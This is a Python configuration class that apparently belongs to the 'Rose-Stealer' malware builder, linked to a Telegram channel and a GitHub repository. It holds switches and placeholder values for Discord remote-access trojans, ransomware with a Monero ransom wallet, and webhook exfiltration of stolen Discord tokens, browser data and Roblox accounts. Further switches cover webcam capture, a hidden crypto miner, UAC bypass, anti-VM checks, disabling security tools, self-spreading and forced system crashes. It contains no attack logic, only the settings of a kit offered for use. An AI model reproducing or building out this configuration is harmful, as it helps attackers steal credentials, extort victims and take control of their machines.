class Config:
    def __init__(self):
        self.webhook = 'WEBHOOK_URL'

        self.debug_mode = False

        self.rose_discord_rat = False
        self.rose_discord_rat_socket_link = 'ROSE_DISCORD_RAT_SOCKET_LINK'
        
        self.knight_discord_rat = False
        self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
        self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
        self.knight_discord_rat_listener_user_id = 'KNIGHT_DISCORD_RAT_LISTENER_USER_ID'
        self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'

        self.ransomware = False
        self.ransomware_email_adress = 'RANS0MWARE_EMAIL'
        self.ransomware_monero_wallet_adress = 'RANSOMWARE_MONERO_ADRESS_'
        self.ransomware_discord_webhook_url = 'RANSOMWARE_WEBHOOKURL'
        self.ransomware_amount_of_money = 'RANSOMWARE_AMOUNT_0F_MONEY'

        self.discord_ping = False
        self.injection = False
        self.token_stealing = False
        self.browser_stealing = False
        self.deviceinf_stealing = False
        self.ipinf_stealing = False
        self.roblox_stealing = False
        self.screenshot = False
        self.start_up = False
        self.silent_crypto__miner = False
        self.wallet_adress = "_WALLET_ADR_HERE"
        self.fake_error = False
        self.nitro_auto_buy = False
        self.uac_bypass = False
        self.antivm = False
        self.webcam = False
        self.spread_malware = False
        self.spread_malware_msg = "SPRMALWARE_MSFG"
        self.rose_melt_stub = False
        self.games = False
        self.ts_bsod = False
        self.bbcrash = False
        self.disable_protectors = False
        self.block_sites = False

        self.eb_color = 16711680
        self.eb_footer = "Rose-Stealer | t.me/rosegrabber"
        self.wh_avatar = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/Rose.png"
        self.wh_name = "Rose-Stealer | t.me/rosegrabber"

    def get_roblox_stealing(self):
        return self.roblox_stealing

    def get_injection(self):
        return self.injection

    def get_token_stealing(self):
        return self.token_stealing 

    def get_browser_stealing(self):
        return self.browser_stealing

    def get_deviceinf_stealing(self):
        return self.deviceinf_stealing

    def get_ipinf_stealing(self):
        return self.ipinf_stealing

    def get_webhook(self):
        return self.webhook

    def get_color(self):
        return self.eb_color

    def get_footer(self):
        return self.eb_footer

    def get_debug_mode(self):
        return self.debug_mode

    def get_avatar(self):
        return self.wh_avatar

    def get_name(self):
        return self.wh_name

    def get_rose_discord_rat(self):
        return self.rose_discord_rat

    def get_rose_discord_rat_link(self):
        return self.rose_discord_rat_socket_link
    
    def get_knight_discord_rat(self):
        return self.knight_discord_rat
    
    def get_knight_discord_rat_bot_token(self):
        return self.knight_discord_rat_bot_token
    
    def get_knight_discord_rat_channel_id(self):
        return self.knight_discord_rat_channel_id
    
    def get_knight_discord_rat_listener_user_id(self):
        return self.knight_discord_rat_listener_user_id
    
    def get_knight_discord_rat_prefix(self):
        return self.knight_discord_rat_prefix
    
    def get_discord_ping(self):
        return self.discord_ping

    def get_screenshot(self):
        return self.screenshot
    
    def get_start_up(self):
        return self.start_up
    
    def silent_crypto_miner(self):
        return self.silent_crypto__miner

    def get_wallet_adress(self):
        return self.wallet_adress

    def get_fake_error(self):
        return self.fake_error
    
    def get_nitro_auto_buy(self):
        return self.nitro_auto_buy

    def get_uac_bypass(self):
        return self.uac_bypass

    def get_antivm(self):
        return self.antivm
    
    def get_webcam(self):
        return self.webcam
    
    def get_ransomware_email_adress(self):
        return self.ransomware_email_adress
    
    def get_ransomware_amount_of_money(self):
        return self.ransomware_amount_of_money
    
    def get_ransomware_monero_wallet_adress(self):
        return self.ransomware_monero_wallet_adress
    
    def get_ransomware_discord_webhook_url(self):
        return self.ransomware_discord_webhook_url
    
    def get_ransomware(self):
        return self.ransomware

    def get_spread_malware(self):
        return self.spread_malware
    
    def get_spread_malware_msg(self):
        return self.spread_malware_msg
    
    def get_rose_melt_stub(self):
        return self.rose_melt_stub

    def get_games(self):
        return self.games

    def get_tsbsod(self):
        return self.ts_bsod

    def get_bbcrash(self):
        return self.bbcrash

    def get_disable_protectors(self):
        return self.disable_protectors

    def get_block_sites(self):
        return self.block_sites
